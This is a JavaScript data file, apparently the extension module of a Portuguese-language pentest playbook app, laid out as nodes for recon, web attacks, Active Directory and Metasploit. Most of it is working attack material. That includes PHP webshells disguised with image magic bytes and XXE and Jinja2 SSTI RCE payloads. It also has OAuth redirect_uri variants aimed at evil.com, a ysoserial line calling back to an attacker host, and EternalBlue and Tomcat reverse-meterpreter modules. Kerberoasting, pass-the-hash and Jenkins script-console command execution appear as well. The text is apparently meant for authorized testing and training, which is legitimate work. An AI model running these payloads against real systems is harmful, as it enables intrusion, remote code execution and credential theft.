/**
 * Phantonite HUB — extensão do playbook (v2)
 * Carrega DEPOIS de data/playbook.js e enriquece window.HUNTER_PLAYBOOK.
 */
(function () {
  if (!window.HUNTER_PLAYBOOK) {
    console.warn("[playbook-extra] HUNTER_PLAYBOOK ausente — carregue playbook.js antes.");
    return;
  }

  var pb = window.HUNTER_PLAYBOOK;

  /* ——— META ——— */
  pb.meta.version = "2.1.0";
  pb.meta.stack = [
    "gobuster", "ffuf", "wfuzz", "nuclei", "Burp Community",
    "rlwrap nc", "hydra", "john", "hashcat", "sqlmap", "msf",
    "nxc/netexec", "impacket", "certipy", "bloodhound mindset",
    "responder", "linpeas", "winpeas", "kubectl", "aws cli concepts",
    "apktool", "jadx", "subfinder", "amass", "gau",
  ];

  /* ——— OUTLINE (minimap) ——— */
  pb.outline = [
    { id: "roe", label: "Escopo" },
    { id: "session", label: "Sessão" },
    { id: "alive", label: "Alvo vivo?" },
    { id: "passive", label: "Recon passivo" },
    { id: "trio", label: "Trio recon" },
    {
      id: "ports",
      label: "Mapa de portas",
      children: [
        { id: "web", label: "Web" },
        { id: "web-api", label: "API" },
        { id: "web-auth", label: "Auth" },
        { id: "web-jwt", label: "JWT" },
        { id: "web-oauth", label: "OAuth" },
        { id: "web-upload", label: "Upload" },
        { id: "web-ssrf", label: "SSRF" },
        { id: "web-xxe", label: "XXE" },
        { id: "web-ssti", label: "SSTI" },
        { id: "web-deserial", label: "Deserial" },
        { id: "web-cache", label: "Cache" },
        { id: "web-lfi", label: "LFI" },
        { id: "web-sqli", label: "SQLi" },
        { id: "web-xss", label: "XSS" },
        { id: "web-cmdi", label: "CMDi" },
        { id: "web-graphql", label: "GraphQL" },
        { id: "nuclei", label: "Nuclei" },
        { id: "burp-method", label: "Burp Suite" },
        { id: "wordpress", label: "WordPress" },
        { id: "jenkins", label: "Jenkins" },
        { id: "tomcat", label: "Tomcat" },
        { id: "msf", label: "Metasploit" },
        { id: "smb", label: "SMB" },
        { id: "nxc-smb", label: "nxc SMB" },
        { id: "ldap", label: "LDAP" },
        { id: "kerberos", label: "Kerberos" },
        { id: "winrm", label: "WinRM" },
        { id: "ssh", label: "SSH" },
        { id: "ftp", label: "FTP" },
        { id: "rdp", label: "RDP" },
        { id: "nfs", label: "NFS" },
        { id: "snmp", label: "SNMP" },
        { id: "smtp", label: "SMTP" },
        { id: "dns-axfr", label: "DNS AXFR" },
        { id: "mysql", label: "MySQL" },
        { id: "mssql", label: "MSSQL" },
        { id: "postgres", label: "Postgres" },
        { id: "redis", label: "Redis" },
        { id: "mongodb", label: "MongoDB" },
        { id: "elasticsearch", label: "Elasticsearch" },
      ],
    },
    { id: "ad-attack", label: "AD hub" },
    { id: "responder", label: "Responder" },
    { id: "ntlm-relay", label: "NTLM relay" },
    { id: "crack-hash", label: "Crack hash" },
    { id: "aws-metadata", label: "AWS metadata" },
    { id: "k8s-exposed", label: "K8s exposto" },
    { id: "android-apk", label: "Android APK" },
    { id: "shell", label: "Shell" },
    { id: "file-xfer", label: "File xfer" },
    { id: "privesc-linux", label: "Privesc Linux" },
    { id: "privesc-windows", label: "Privesc Windows" },
    { id: "lateral", label: "Lateral" },
    { id: "report", label: "Report" },
    { id: "retest", label: "Reteste" },
  ];

  /* ——— NOVOS NÓS ——— */
  Object.assign(pb.nodes, {
    /* ——— PASSIVE RECON ——— */
    passive: {
      phase: "Recon",
      title: "Recon passivo",
      say: "Antes do IP: o que já vazou (subs, certs, URLs).",
      blocks: [
        {
          title: "Subdomínios — subfinder",
          cmd: `subfinder -d "$DOMAIN" -silent
# se tiver API keys configuradas, o yield sobe muito`,
          label: "bash",
          why: "Passivo de verdade: fontes OSINT. Não resolve DNS agressivo ainda.",
        },
        {
          title: "Amass (nota)",
          html: `<p><code>amass enum -passive -d "$DOMAIN"</code> é o canhão. Em engajamento curto, subfinder + crt.sh costuma bastar. Amass quando o escopo é org inteira e tu tem tempo.</p>`,
        },
        {
          title: "crt.sh — Certificate Transparency",
          cmd: `curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \\
  | jq -r '.[].name_value' 2>/dev/null | sed 's/\\*\\.//g' | sort -u \\
# fallback sem jq:
# curl -s "https://crt.sh/?q=%25.$DOMAIN" | grep -oP '[a-z0-9.-]+\\.'"$DOMAIN" | sort -u`,
          label: "bash",
          why: "CT logs pegam sub que o subfinder às vezes perde. Une com subfinder antes de resolver.",
        },
        {
          title: "Wayback / gau — URLs históricas",
          cmd: `echo "$DOMAIN" | gau --subs | head -200
# filtra endpoints suculentos
echo "$DOMAIN" | gau --subs | grep -Ei 'admin|api|backup|\\.env|\\.git|swagger|graphql|upload' | sort -u | head -80`,
          label: "bash",
          why: "Path antigo no Wayback = superfície que o gobuster ainda não viu.",
        },
        {
          title: "GitHub dorks (manual / GHsearch)",
          html: `<ul>
            <li><code>"$DOMAIN" password</code> / <code>filename:.env</code></li>
            <li><code>"$DOMAIN" api_key</code> / <code>AWS_SECRET</code></li>
            <li><code>org:CLIENTE filename:config</code></li>
          </ul>
          <p>Não clona repo privado sem RoE. Achado de secret = finding direto.</p>`,
        },
        {
          title: "ASN / ranges",
          cmd: `# quem anuncia o IP?
whois "$IP"
# se DOMAIN → ranges da org (amass intel / bgp.he.net)
curl -s "https://api.hackertarget.com/aslookup/?q=$IP"`,
          label: "bash",
          why: "ASN grande = superfície lateral. Só varre IPs in-scope.",
        },
      ],
      choices: [
        { label: "Passivo feito — trio ativo", hint: "dig + nmap + gobuster", to: "trio" },
        { label: "Achei secret/URL — reportar", to: "report" },
        { label: "Já tenho nmap — mapa de portas", to: "ports" },
      ],
    },

    /* ——— WEB DEEP ——— */
    "web-api": {
      phase: "Web",
      title: "API / OpenAPI",
      say: "XHR no DevTools mapeia a API. Swagger aberto ajuda; BOLA/IDOR é o foco.",
      blocks: [
        {
          title: "Achar spec",
          cmd: `for p in swagger.json swagger/v1/swagger.json openapi.json openapi.yaml api-docs v2/api-docs v3/api-docs; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/$p")
  echo "$code  /$p"
done`,
          label: "bash",
        },
        {
          title: "Auth headers — baseline",
          html: `<ul>
            <li>Captura request autenticado no Burp</li>
            <li>Anota: <code>Authorization: Bearer …</code>, <code>X-Api-Key</code>, cookies de sessão</li>
            <li>Replay sem header → 401? Com header de outro user → IDOR?</li>
          </ul>`,
          cmd: `curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/me"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/2"`,
          label: "bash",
          why: "Troca o ID. Se voltar dados do user 2 com token do 1 = BOLA.",
        },
        {
          title: "BOLA / IDOR em massa (ffuf)",
          cmd: `ffuf -u "$TARGET/api/v1/users/FUZZ" -w $WORDLIST_IDS \\
  -H "Authorization: Bearer $TOKEN" -mc 200`,
          label: "bash",
        },
        {
          title: "Mass assignment",
          html: `<p>No POST/PUT de perfil, injeta claims privilegiados no JSON:</p>
<pre>{"email":"x@y.com","role":"admin","isAdmin":true,"verified":true}</pre>
<p>Compara resposta e GET subsequente. Um campo aceito = finding.</p>`,
        },
      ],
      choices: [
        { label: "JWT no Authorization", to: "web-jwt" },
        { label: "OAuth / SSO no fluxo", to: "web-oauth" },
        { label: "Nuclei na API", to: "nuclei" },
        { label: "Finding — reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "web-jwt": {
      phase: "Web",
      title: "JWT — abusos clássicos",
      say: "JWT = blob assinável. Verificação frouxa → troca claim no Repeater.",
      blocks: [
        {
          title: "Decodifica e inventaria",
          cmd: `# cola o token em jwt.io ou:
python3 -c "import sys,base64,json; p=sys.argv[1].split('.')[1]+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))" "$JWT"`,
          label: "bash",
          why: "Olha alg, kid, role, sub, exp. Anota claims mutáveis.",
        },
        {
          title: "alg=none",
          html: `<ul>
            <li>Header: <code>{"alg":"none","typ":"JWT"}</code></li>
            <li>Payload: sobe <code>role</code>/<code>admin</code></li>
            <li>Assinatura: vazia (ou <code>.</code> só)</li>
          </ul>
          <p>Muitos frameworks modernos rejeitam. Ainda vale testar — um sim e acabou.</p>`,
        },
        {
          title: "kid / jwk injection (conceitos)",
          html: `<ul>
            <li><strong>kid</strong> apontando pra arquivo local / SQL → path/SQLi no verify</li>
            <li><strong>jwk/jku</strong> embutido: servidor confia na chave que tu manda?</li>
            <li>Ferramentas: <code>jwt_tool</code>, Burp JWT Editor</li>
          </ul>`,
          cmd: `jwt_tool "$JWT" -C -d "wordlist_secrets.txt"
# ou brute HS256 se suspeitar de secret fraco`,
          label: "bash",
        },
        {
          title: "Claim tamper",
          html: `<p>Com secret conhecido/fraco ou alg quebrado: muda <code>sub</code>, <code>role</code>, <code>tenant_id</code>, zera <code>exp</code>. Replay no Repeater.</p>`,
        },
      ],
      choices: [
        { label: "Auth web geral", to: "web-auth" },
        { label: "API / BOLA", to: "web-api" },
        { label: "Bypass = reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-oauth": {
      phase: "Web",
      title: "OAuth / OIDC",
      say: "OAuth quebrado = session takeover sem tocar no password. Foca redirect_uri, state e vazamento de token.",
      blocks: [
        {
          title: "Mapa do fluxo",
          html: `<ul>
            <li>Acha <code>/authorize</code>, <code>client_id</code>, <code>redirect_uri</code>, <code>response_type</code></li>
            <li>Anota se usa code ou token (implicit = mais fácil vazar)</li>
            <li>State presente e validado?</li>
          </ul>`,
        },
        {
          title: "redirect_uri open redirect / takeover",
          html: `<p>Testa variações:</p>
<pre>redirect_uri=https://evil.com
redirect_uri=https://$DOMAIN.evil.com
redirect_uri=https://$DOMAIN/callback/../../../evil
redirect_uri=https://$DOMAIN%40evil.com</pre>
<p>Se o IdP aceitar e mandar code/token pro teu host = game over.</p>`,
        },
        {
          title: "state / CSRF de login",
          html: `<ul>
            <li>Remove <code>state</code> → ainda autentica?</li>
            <li>Reusa state de outra sessão</li>
            <li>Sem state = vítima loga na conta do atacante (login CSRF)</li>
          </ul>`,
        },
        {
          title: "Token leak",
          html: `<ul>
            <li>Token no fragmento (#access_token=) → referer/logs?</li>
            <li>Code em query → proxy/history de terceiros?</li>
            <li>Mobile deep link mal validado</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "JWT depois do token", to: "web-jwt" },
        { label: "Achado OAuth — reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "web-upload": {
      phase: "Web",
      title: "Upload de arquivo",
      say: "Upload é o atalho clássico pra RCE. Type juggling, magic bytes e path traversal — nessa ordem mental.",
      blocks: [
        {
          title: "Type juggling / content-type",
          html: `<ul>
            <li>Extensão: <code>shell.php.jpg</code>, <code>shell.phtml</code>, <code>shell.php%00.jpg</code></li>
            <li>Content-Type: image/jpeg com body PHP</li>
            <li>Double extension / case: <code>.PhP</code></li>
          </ul>`,
          cmd: `printf '<?php system($_GET["c"]); ?>' > /tmp/shell.php
# tenta renomes e Content-Type no Burp Repeater`,
          label: "bash",
        },
        {
          title: "Magic bytes",
          cmd: `# GIF89a + webshell
printf 'GIF89a<?php system($_GET["c"]); ?>' > /tmp/shell.gif
# JPEG stub
printf '\\xff\\xd8\\xff\\xe0<?php system($_GET["c"]); ?>' > /tmp/shell.jpg`,
          label: "bash",
          why: "Filtro que só olha magic bytes + extensão fraca = RCE.",
        },
        {
          title: "Path / overwrite",
          html: `<ul>
            <li>Filename: <code>../../var/www/html/shell.php</code></li>
            <li>Sobrescreve config? <code>.htaccess</code>, <code>web.config</code></li>
            <li>Onde o arquivo cai? Lista dir / response URL</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Upload virou RCE — shell", to: "shell" },
        { label: "WordPress upload?", to: "wordpress" },
        { label: "Reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-ssrf": {
      phase: "Web",
      title: "SSRF",
      say: "Parâmetro que puxa URL = SSRF até prova em contrário. Prioridade: metadata cloud, depois rede interna.",
      tone: "warn",
      blocks: [
        {
          title: "Provas baratas",
          cmd: `# Burp Collaborator / interactsh / webhook.site
curl -s "$TARGET/fetch?url=http://SEU_COLABORATOR"`,
          label: "bash",
        },
        {
          title: "Cloud metadata (AWS)",
          cmd: `# IMDSv1 clássico — só se o parâmetro SSRF alcançar a rede do host
# http://169.254.169.254/latest/meta-data/
# http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
          label: "conceito",
          why: "IMDSv2 precisa de token PUT. Se só v1 responder via SSRF = finding Critical quase sempre.",
        },
        {
          title: "Interno",
          html: `<ul>
            <li><code>http://127.0.0.1:$RPORT</code>, <code>http://localhost/admin</code></li>
            <li><code>http://[::1]/</code>, bypass de filtro</li>
            <li><code>file:///etc/passwd</code> se o parser permitir</li>
            <li>Dict/gopher pra Redis interno (avançado)</li>
          </ul>`,
        },
        {
          title: "Encaminhar",
          html: `<p>SSRF confirmado em cloud? Vai pro ramo <strong>aws-metadata</strong>. Em k8s? <strong>k8s-exposed</strong>.</p>`,
        },
      ],
      choices: [
        { label: "Metadata AWS no escopo", to: "aws-metadata" },
        { label: "Cheiro de k8s", to: "k8s-exposed" },
        { label: "SSRF = reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-xxe": {
      phase: "Web",
      title: "XXE",
      say: "Upload XML, SOAP, SAML, OOXML — qualquer parser XML velho merece um ENTITY.",
      blocks: [
        {
          title: "Probe clássico (leitura local)",
          cmd: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
          label: "payload",
        },
        {
          title: "OOB / blind",
          html: `<pre>&lt;!DOCTYPE foo [
  &lt;!ENTITY % dtd SYSTEM "http://SEU_COLABORATOR/xxe.dtd"&gt;
  %dtd;
]&gt;</pre>
<p>Se a app não reflete, Collaborator ainda denuncia o parser resolvendo entidade externa.</p>`,
        },
        {
          title: "Onde procurar",
          html: `<ul>
            <li>Content-Type: <code>application/xml</code> / <code>text/xml</code></li>
            <li>Upload .svg, .docx, .xlsx</li>
            <li>SAMLResponse / SOAP</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Leitura → pivota SSRF?", to: "web-ssrf" },
        { label: "XXE = reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-ssti": {
      phase: "Web",
      title: "SSTI",
      say: "Input refletido em template = RCE disfarçado de XSS. Probe matemático primeiro, payload de engine depois.",
      blocks: [
        {
          title: "Probe",
          cmd: `# no parâmetro refletido:
{{7*7}}
\${7*7}
<%= 7*7 %>
#{7*7}
# 49 na resposta = motor vivo`,
          label: "payload",
        },
        {
          title: "Identificar engine",
          html: `<div class="table-wrap"><table>
            <tr><th>Sintaxe</th><th>Pista</th></tr>
            <tr><td><code>{{…}}</code></td><td>Jinja2 / Twig / Angular</td></tr>
            <tr><td><code>\${…}</code></td><td>FreeMarker / JS template</td></tr>
            <tr><td><code>&lt;%= … %&gt;</code></td><td>ERB / JSP</td></tr>
          </table></div>
          <p>Payloads de RCE: PayloadsAllTheThings → SSTI. Não dispara canhão sem confirmar o motor.</p>`,
        },
        {
          title: "Jinja2 (exemplo)",
          cmd: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`,
          label: "payload",
          why: "Só depois do probe. Em produção sensível, prova com id/hostname e para.",
        },
      ],
      choices: [
        { label: "RCE — abrir listener", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-deserial": {
      phase: "Web",
      title: "Deserialização",
      say: "Cookie/blob binário, ViewState, Java serialized, PHP unserialize — high level: se o server reconstrói objeto que tu controla, é RCE em potencial.",
      tone: "warn",
      blocks: [
        {
          title: "Sinais",
          html: `<ul>
            <li><strong>Java:</strong> <code>rO0AB</code> (base64 de <code>ac ed 00 05</code>)</li>
            <li><strong>PHP:</strong> <code>O:4:"User"</code> em cookie/param</li>
            <li><strong>.NET:</strong> ViewState, <code>AAEAAAD/////</code>, BinaryFormatter legado</li>
            <li>Content-Type: <code>application/x-java-serialized-object</code></li>
          </ul>`,
        },
        {
          title: "Java (ysoserial mindset)",
          html: `<p>Gadget chain depende do classpath. Em pentest: identifica lib (CommonsCollections etc.), gera payload com ysoserial, testa em lab clone se possível. Não joga RCE cego em prod sem RoE.</p>`,
          cmd: `# ysoserial exemplo (lab):
# java -jar ysoserial.jar CommonsCollections1 'curl http://$LHOST/pwned' | base64 -w0`,
          label: "conceito",
        },
        {
          title: "PHP / .NET",
          html: `<ul>
            <li>PHP: phpggc + magic methods (<code>__destruct</code>)</li>
            <li>.NET: ViewState sem MAC / chave vazada → ysso.net / Blacklist3r</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "RCE confirmado — shell", to: "shell" },
        { label: "Reportar (mesmo sem RCE full)", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-cache": {
      phase: "Web",
      title: "Web cache poisoning / deception",
      say: "Cache compartilhado. Chave errada → resposta tua pra outra vítima.",
      blocks: [
        {
          title: "Poisoning — mindset",
          html: `<ul>
            <li>Acha header unkeyed que muda resposta (X-Forwarded-Host, X-Original-URL…)</li>
            <li>Resposta cacheável (Cache-Control / CDN hit)</li>
            <li>Injeta payload no unkeyed → próxima request limpa serve veneno</li>
          </ul>
          <p>Ferramenta mental: Param Miner (Burp) + Observer.</p>`,
        },
        {
          title: "Cache deception",
          html: `<ul>
            <li>Path: <code>/account/settings/foo.css</code> — CDN acha estático, origin devolve HTML autenticado</li>
            <li>Extensão falsa / path normalization diverge entre cache e origin</li>
          </ul>`,
          cmd: `curl -sI "$TARGET/account"
curl -sI "$TARGET/account/x.css"
# compara Cache-Control / CF-Cache-Status / Age`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Impacto em user — reportar", to: "report" },
        { label: "Burp Suite", to: "burp-method" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    nuclei: {
      phase: "Web",
      title: "Nuclei",
      say: "Templates CVE / misconfig / exposure. Valida hit no curl/Burp antes de reportar.",
      blocks: [
        {
          title: "Scan direcionado",
          cmd: `nuclei -u "$TARGET"
# mais barulho / cobertura:
nuclei -u "$TARGET" -t http/cves/ -t http/exposures/ -t http/misconfiguration/ -severity medium,high,critical`,
          label: "bash",
          why: "Em prod: rate consciente. Em lab: pode abrir o cano.",
        },
        {
          title: "Com Basic Auth",
          cmd: `nuclei -u "$TARGET/protected/" \\
  -H "Authorization: Basic $(echo -n 'USER:PASS' | base64 -w0)" \\
  -t http/misconfiguration/ -t http/exposures/ -t http/cves/ \\
  -severity medium,high,critical`,
          label: "bash",
          why: "Troca USER:PASS (ex. bobo:bubbles). Path = pasta que abriu com 200.",
        },
        {
          title: "Lista de URLs",
          cmd: `nuclei -l urls.txt
# tags úteis: tech, misconfig, exposure, cve`,
          label: "bash",
        },
        {
          title: "Como ler",
          html: `<ul>
            <li>Cada hit = hipótese, não finding automático</li>
            <li>Valida no Burp / curl antes de reportar</li>
            <li>False positive de template é normal — não enche o PDF</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Hit web → aprofundar", to: "web" },
        { label: "Hit WordPress", to: "wordpress" },
        { label: "Hit Jenkins", to: "jenkins" },
        { label: "Tomcat /manager", to: "tomcat" },
        { label: "Validado — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    msf: {
      phase: "Foothold",
      title: "Metasploit",
      say: "msfconsole: search → use → set → run. LHOST = tun0. RPORT = porta do serviço (Tomcat ≠ 80).",
      blocks: [
        {
          title: "Abrir",
          cmd: `msfconsole -q
# atualizar DB (raro, demora):
# sudo msfdb init
# msfupdate`,
          label: "bash → msf",
        },
        {
          title: "Ritual",
          cmd: `search NOME
use caminho/do/modulo
show options
show payloads
set RHOSTS $IP
set RPORT $RPORT
set LHOST $LHOST
set LPORT $LPORT
setg LHOST $LHOST
setg LPORT $LPORT
run
# ou: exploit -j   (job em background)`,
          label: "msfconsole",
          why: "setg grava LHOST/LPORT pra todos os módulos da sessão.",
        },
        {
          title: "Handler manual (payload fora do exploit)",
          cmd: `use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
run -j`,
          label: "msfconsole",
        },
        {
          title: "Tomcat manager → WAR upload",
          cmd: `use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $IP
set RPORT $RPORT
set HttpUsername USER
set HttpPassword PASS
set LHOST $LHOST
set LPORT $LPORT
set PAYLOAD java/meterpreter/reverse_tcp
# Linux sem java payload estável:
# set PAYLOAD linux/x64/meterpreter/reverse_tcp
run`,
          label: "msfconsole",
          why: "Cred = manager-gui. ToolsRUs: RPORT 1234, bob:bubbles.",
        },
        {
          title: "EternalBlue (SMB)",
          cmd: `use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set LHOST $LHOST
run`,
          label: "msfconsole",
        },
        {
          title: "Sessões / meterpreter",
          cmd: `sessions -l
sessions -i 1
getuid
sysinfo
pwd
download /etc/passwd
upload ./linpeas.sh /tmp/linpeas.sh
shell
background
sessions -k 1`,
          label: "msfconsole",
        },
        {
          title: "Falhou?",
          html: `<ul>
            <li>LHOST errado (eth0 vs tun0)</li>
            <li>RPORT default 80 com serviço em outra porta</li>
            <li>Payload arch/OS errado</li>
            <li>Firewall no caminho do reverse</li>
            <li><code>set VERBOSE true</code> / <code>check</code> antes do run</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Tomcat /manager", to: "tomcat" },
        { label: "SMB / EternalBlue", to: "smb" },
        { label: "Shell / TTY", to: "shell" },
        { label: "Privesc Linux", to: "privesc-linux" },
        { label: "Privesc Windows", to: "privesc-windows" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "burp-method": {
      phase: "Web",
      title: "Burp Suite",
      say: "Proxy → Repeater. Community aguenta lab. Scope primeiro; Intruder depois.",
      blocks: [
        {
          title: "Setup",
          html: `<ul>
            <li>Burp Community → Proxy → Intercept on</li>
            <li>Browser: proxy <code>127.0.0.1:8080</code> (FoxyProxy) ou burp browser</li>
            <li>CA: http://burpsuite → import cert (HTTPS)</li>
            <li>Target → Scope = host in-scope só</li>
            <li>Proxy → Intercept off pra navegar; liga pra capturar 1 request</li>
          </ul>`,
        },
        {
          title: "Fluxo diário",
          html: `<ol>
            <li>Navega o app com Intercept off (HTTP history enche)</li>
            <li>History → Send to Repeater (request interessante)</li>
            <li>Repeater: muda 1 coisa, Send, compara</li>
            <li>Achado: salva request/response (Copy / Save)</li>
          </ol>`,
        },
        {
          title: "Repeater — 1 variável",
          html: `<ul>
            <li>Baseline: 200 + body conhecido</li>
            <li>Método GET↔POST↔PUT↔DELETE</li>
            <li>Content-Type json ↔ form ↔ xml</li>
            <li>Auth: tira header, troca user, token velho</li>
            <li>IDOR: incrementa id</li>
            <li>Path: <code>../</code>, encoding duplo</li>
          </ul>`,
        },
        {
          title: "Intruder (Community = lento)",
          html: `<ul>
            <li>Send to Intruder → Positions: marca o valor com §</li>
            <li>Attack type: Sniper</li>
            <li>Payloads: wordlist curta (IDs, users)</li>
            <li>Olha Status / Length — anomalia = ponto</li>
            <li>Lab grande: ffuf/wfuzz no bash é mais rápido</li>
          </ul>`,
        },
        {
          title: "Decoder / Comparer",
          html: `<ul>
            <li>Decoder: Base64, URL, JWT parts</li>
            <li>Comparer: duas responses lado a lado (length/bytes)</li>
          </ul>`,
        },
        {
          title: "Basic Auth no Burp",
          cmd: `# Header pronto (bobo:bubbles exemplo):
# Authorization: Basic Ym9iOmJ1YmJsZXM=
echo -n 'USER:PASS' | base64 -w0`,
          label: "bash",
          why: "Cola no Repeater se o site pedir Basic de novo.",
        },
        {
          title: "Evidência",
          cmd: `# Repeater → Save item / Copy to file
# Nota: URL, método, param, resposta que prova o bug`,
          label: "nota",
        },
      ],
      choices: [
        { label: "Web — continuar enum", to: "web" },
        { label: "Auth / login", to: "web-auth" },
        { label: "API / BOLA", to: "web-api" },
        { label: "JWT", to: "web-jwt" },
        { label: "SQLi", to: "web-sqli" },
        { label: "XSS", to: "web-xss" },
        { label: "Metasploit", to: "msf" },
        { label: "Achado — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    wordpress: {
      phase: "Web",
      title: "WordPress",
      say: "WP é superfície previsível: users, plugins podres, xmlrpc, upload. Enum antes de CVE aleatório.",
      blocks: [
        {
          title: "Enum",
          cmd: `wpscan --url "$TARGET" --enumerate u,ap,tt --plugins-detection mixed
curl -s "$TARGET/wp-json/wp/v2/users"
curl -sI "$TARGET/xmlrpc.php"`,
          label: "bash",
        },
        {
          title: "xmlrpc / brute (RoE)",
          cmd: `# multicall = brute amplificado — rate e RoE!
wpscan --url "$TARGET" -U $USERS -P $WORDLIST_PASS --password-attack xmlrpc`,
          label: "bash",
        },
        {
          title: "Plugin / theme",
          html: `<p>Versão do plugin → searchsploit / nuclei tag wordpress. Upload em theme editor só com auth admin (já é game over pra report).</p>`,
        },
      ],
      choices: [
        { label: "Upload / RCE", to: "web-upload" },
        { label: "Nuclei WP templates", to: "nuclei" },
        { label: "Shell", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    jenkins: {
      phase: "Web",
      title: "Jenkins",
      say: "Jenkins sem auth ou com cred fraca = RCE via script console. Trata como Critical até prova contrária.",
      tone: "warn",
      blocks: [
        {
          title: "Checagem",
          cmd: `curl -sI "http://$IP:$RPORT/"
curl -s "http://$IP:$RPORT/script" | head
nmap -sV -p "$RPORT" --script http-jenkins-enum "$IP"`,
          label: "bash",
        },
        {
          title: "Script console (se autenticado / aberto)",
          html: `<p>Groovy:</p>
<pre>println "cmd /c whoami".execute().text
// ou Linux:
println "id".execute().text</pre>
<p>Sem auth no /script = finding imediato. Não precisa ser criativo.</p>`,
        },
        {
          title: "Creds / nodes",
          html: `<ul>
            <li><code>/credentials</code> — secrets em plain/encrypted</li>
            <li>Build history com tokens em log</li>
            <li>Agentes com labels sensíveis</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "RCE — shell", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— NETWORK EXTRA ——— */
    ldap: {
      phase: "Rede",
      title: "LDAP (389 / 636)",
      say: "LDAP exposto = enum de AD barato. Anonymous bind primeiro; senão, cred que tu já tem.",
      blocks: [
        {
          title: "Nmap + anonymous",
          cmd: `nmap -sV -p 389,636 --script ldap-rootdse,ldap-search "$IP"
ldapsearch -x -H ldap://"$IP" -b "" -s base namingContexts
ldapsearch -x -H ldap://"$IP" -b "DC=lab,DC=local" "(objectClass=person)" sAMAccountName`,
          label: "bash",
          why: "Ajusta o base DN pro domínio real (RootDSE entrega).",
        },
        {
          title: "LDAPS / cred",
          cmd: `ldapsearch -x -H ldaps://"$IP" -D "user@domain" -w 'PASS' -b "DC=domain,DC=tld" "(sAMAccountName=*)"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "AD hub — correlacionar", to: "ad-attack" },
        { label: "Kerberos / AS-REP", to: "kerberos" },
        { label: "Users → spray", to: "nxc-smb" },
        { label: "Reportar enum", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    kerberos: {
      phase: "Rede",
      title: "Kerberos (88)",
      say: "Porta 88 = domínio. AS-REP / Kerberoast antes de barulho.",
      blocks: [
        {
          title: "Descobrir realm",
          cmd: `nmap -sV -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN" "$IP"
nxc smb "$IP" --users`,
          label: "bash",
        },
        {
          title: "AS-REP Roast (users sem pre-auth)",
          cmd: `impacket-GetNPUsers "$DOMAIN/" -usersfile $USERS -dc-ip "$IP" -format hashcat
# ou com cred de domínio:
impacket-GetNPUsers "$DOMAIN/user:pass" -request -dc-ip "$IP" -format hashcat`,
          label: "bash",
          why: "Hash $23$ → hashcat -m 18200. Sem senha inicial se o user permitir AS-REP.",
        },
        {
          title: "Kerberoast",
          cmd: `impacket-GetUserSPNs "$DOMAIN/user:pass" -dc-ip "$IP" -request
# hashcat -m 13100`,
          label: "bash",
        },
        {
          title: "Certipy (AD CS)",
          cmd: `certipy find -u 'user@$DOMAIN' -p 'pass' -dc-ip "$IP" -vulnerable -stdout
# ESC1/ESC8 etc. — se template vulnerável, game ADCS`,
          label: "bash",
          why: "BloodHound mindset: caminho até DA via cert > spray cego.",
        },
      ],
      choices: [
        { label: "AD hub", to: "ad-attack" },
        { label: "nxc / spray", to: "nxc-smb" },
        { label: "Hash → crack hub", to: "crack-hash" },
        { label: "Hash crackado — lateral", to: "lateral" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    winrm: {
      phase: "Rede",
      title: "WinRM (5985 / 5986)",
      say: "WinRM é shell remoto com cred. evil-winrm é o caminho feliz; nxc confirma auth antes.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 5985,5986 "$IP"
nxc winrm "$IP" -u user -p 'pass'`,
          label: "bash",
        },
        {
          title: "evil-winrm",
          cmd: `evil-winrm -i "$IP" -u user -p 'pass'
# HTTPS / ignora cert:
evil-winrm -i "$IP" -u user -p 'pass' -S`,
          label: "bash",
        },
        {
          title: "Pass-the-hash",
          cmd: `evil-winrm -i "$IP" -u user -H 'NTHASH'
nxc winrm "$IP" -u user -H 'NTHASH'`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Shell Windows — privesc", to: "privesc-windows" },
        { label: "Lateral / PTH", to: "lateral" },
